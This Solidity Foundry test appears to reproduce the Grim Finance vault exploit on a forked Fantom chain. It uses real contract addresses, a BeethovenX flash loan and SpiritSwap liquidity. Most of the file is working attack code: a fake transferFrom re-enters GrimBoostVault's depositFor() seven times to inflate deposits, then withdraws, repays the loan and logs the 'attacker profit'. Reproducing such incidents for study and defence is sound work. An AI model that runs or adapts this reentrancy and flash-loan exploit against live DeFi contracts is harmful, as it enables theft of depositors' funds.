// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IWFTM} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
import {IERC20Metadata as IERC20} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
import {IFlashLoanRecipient} from "src/interfaces/IFlashLoanRecipient.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
import {IPancakePair} from "src/interfaces/IPancakePair.sol";

interface IGrimBoostVault {
    event NewStratCandidate(address implementation);
    event UpgradeStrat(address implementation);

    function want() external view returns (IERC20);
    function balance() external view returns (uint256);
    function available() external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function depositAll() external;
    function deposit(uint256 _amount) external;
    function earn() external;
    function withdrawAll() external;
    function withdraw(uint256 _shares) external;
    function proposeStrat(address _implementation) external;
    function upgradeStrat() external;
    function inCaseTokensGetStuck(address _token) external;
    function depositFor(address token, uint256 _amount, address user) external;
}

interface IBeethovenVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}
contract ContractTest is Test {
    address btcAddress = 0x321162Cd933E2Be498Cd2267a90534A804051b11;
    address wftmAddress = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address routerAddress = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;
    address btc_wftm_address = 0x279b2c897737a50405ED2091694F225D83F2D3bA; //Spirit LPs
    address beethovenVaultAddress = 0x20dd72Ed959b6147912C2e529F0a0C651c33c9ce; //Flash Loan Pool
    address grimBoostVaultAddress = 0x660184CE8AF80e0B1e5A1172A16168b15f4136bF;
    IERC20 btc = IERC20(btcAddress);
    IWFTM wftm = IWFTM(payable(wftmAddress));
    IUniswapV2Router router = IUniswapV2Router(payable(routerAddress)); //SpiritSwap Router
    IPancakePair btc_wftm = IPancakePair(btc_wftm_address);
    IBeethovenVault beethovenVault = IBeethovenVault(beethovenVaultAddress);
    IGrimBoostVault grimBoostVault = IGrimBoostVault(grimBoostVaultAddress);
    uint256 btcLoanAmount = 30 * 1e8;
    uint256 wftmLoanAmount = 937_830 * 1e18;
    uint256 reentrancySteps = 7;
    uint256 lpBalance;

    function setUp() public {
        vm.createSelectFork("fantom", 25_345_002); //fork fantom at block 25345002
    }

    function testExploit() public {
        //Flash Loan WFTM and "BTC" frm BeethovenX
        IERC20[] memory loanTokens = new IERC20[](2);
        loanTokens[0] = wftm;
        loanTokens[1] = btc;
        uint256[] memory loanAmounts = new uint256[](2);
        loanAmounts[0] = wftmLoanAmount;
        loanAmounts[1] = btcLoanAmount;
        beethovenVault.flashLoan(
            IFlashLoanRecipient(address(this)),
            loanTokens,
            loanAmounts,
            "0x"
        );
    }

    // Called after receiving Flash Loan Funds
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) public {
        // Add Liquidity to SpiritSwap
        wftm.approve(routerAddress, wftmLoanAmount);
        btc.approve(routerAddress, btcLoanAmount);
        router.addLiquidity(
            btcAddress,
            wftmAddress,
            btcLoanAmount,
            wftmLoanAmount,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Call depositFor() in GrimBoostVault, reentrancy to this.transferFrom
        btc_wftm.approve(grimBoostVaultAddress, 2 ** 256 - 1);
        lpBalance = btc_wftm.balanceOf(address(this));
        grimBoostVault.depositFor(address(this), lpBalance, address(this));

        // Withdraw LPs from GrimBoostVault
        grimBoostVault.withdrawAll();

        // Remove Liquidity from SpiritSwap
        lpBalance = btc_wftm.balanceOf(address(this));
        btc_wftm.transfer(btc_wftm_address, lpBalance);
        btc_wftm.burn(address(this));

        //Repay Flash Loan
        for (uint256 i = 0; i < tokens.length; ++i) {
            IERC20 _token = tokens[i];
            uint256 _amount = amounts[i];
            uint256 _feeAmount = feeAmounts[i];
            _token.transfer(beethovenVaultAddress, (_amount + _feeAmount));
        }

        emit log_named_uint(
            "WFTM attacker profit",
            wftm.balanceOf(address(this)) / 1e18
        );

        emit log_named_uint(
            "BTC attacker profit",
            btc.balanceOf(address(this)) / 1e8
        );
    }

    // Called by the reentrancy vulnerability in grimBoostVault.depositFor()
    function transferFrom(address _from, address _to, uint256 _value) public {
        reentrancySteps -= 1;
        if (reentrancySteps > 0) {
            //Call depositFor() in GrimBoostVault with token==ATTACKER, user==ATTACKER
            grimBoostVault.depositFor(address(this), lpBalance, address(this));
        } else {
            //In the last step on reentrancy call depositFor() with token==SPIRIT-LP, user==ATTACKER
            grimBoostVault.depositFor(
                btc_wftm_address,
                lpBalance,
                address(this)
            );
        }
    }
}
